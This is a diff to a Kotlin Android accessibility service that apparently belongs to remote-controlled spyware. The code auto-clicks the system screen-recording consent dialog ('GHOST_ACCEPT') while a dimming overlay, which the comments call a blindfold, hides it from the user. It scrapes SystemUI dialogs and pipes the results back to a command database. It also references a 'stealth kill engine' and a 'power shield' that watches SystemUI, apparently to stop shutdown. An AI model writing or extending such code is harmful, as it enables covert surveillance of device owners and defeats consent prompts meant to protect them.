@@ -307,12 +307,40 @@ class MyAccessibilityService : AccessibilityService() {
 
         // --- STEALTH KILL ENGINE MOVED TO DEDICATED COROUTINE ---
         
-        // --- SCREEN RECORD GHOST LOGIC ---
+        // --- SCREEN RECORD GHOST LOGIC (DECOUPLED) ---
+        if (ScreenRecordManager.expectedMode == "AUTO") {
+            val root = rootInActiveWindow
+            val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
+            val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
+            
+            for (node in (startNodes + altNodes)) {
+                if (node.isClickable) {
+                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                    DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
+                    ScreenRecordManager.expectedMode = "" // Disarm
+                    DimmerManager.removeOverlay(this) // Remove the blindfold
+                    CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
+                    break
+                }
+            }
+        } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
+            val treeJson = getInstantTree(null, 10)
+            val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
+            DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
+            DebugLogger.log("SCREEN_REC", "Scraped dialog for forensic mapping. Pkg: $pkgName")
+            ScreenRecordManager.expectedMode = "" // Disarm
+            
+            // Pipe the scraped payload directly back to the database
+            CoroutineScope(Dispatchers.IO).launch {
+                CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
+            }
+        }
+
+        // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
             val isStateChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
             val isContentChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
 
-            // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
             val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
             
@@ -373,29 +401,6 @@ class MyAccessibilityService : AccessibilityService() {
                         }
                     }
                 }
-            }
-
-            if (ScreenRecordManager.expectedMode == "AUTO") {
-                val root = rootInActiveWindow
-                val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
-                val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
-                
-                for (node in (startNodes + altNodes)) {
-                    if (node.isClickable) {
-                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
-                        ScreenRecordManager.expectedMode = "" // Disarm
-                        DimmerManager.removeOverlay(this) // Remove the blindfold
-                        CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
-                        break
-                    }
-                }
-            } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
-                val treeJson = getInstantTree(null, 10)
-                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
-                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
-                DebugLogger.log("SCREEN_REC", "Scraped SystemUI dialog for forensic mapping.")
-                ScreenRecordManager.expectedMode = "" // Disarm
             }
         }
 
